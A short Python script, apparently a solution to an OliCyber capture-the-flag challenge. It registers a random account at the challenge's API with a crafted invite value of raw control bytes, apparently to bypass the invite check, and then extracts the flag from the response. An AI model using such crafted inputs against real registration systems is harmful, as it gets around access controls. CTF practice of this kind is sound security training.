import requests
import random
import string
import re

url = 'http://frittomisto.challs.olicyber.it/api/register'

username, password = ["".join(random.choices(string.ascii_uppercase + string.digits, k=10)) for _ in range(2)]

r=requests.post(url, json={
    "username": f"{username}",
    "password": f"{password}",
    "invite": "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09"
})

flag = re.findall(r'flag\{.*?}', r.text)
if flag:
    print(flag[0])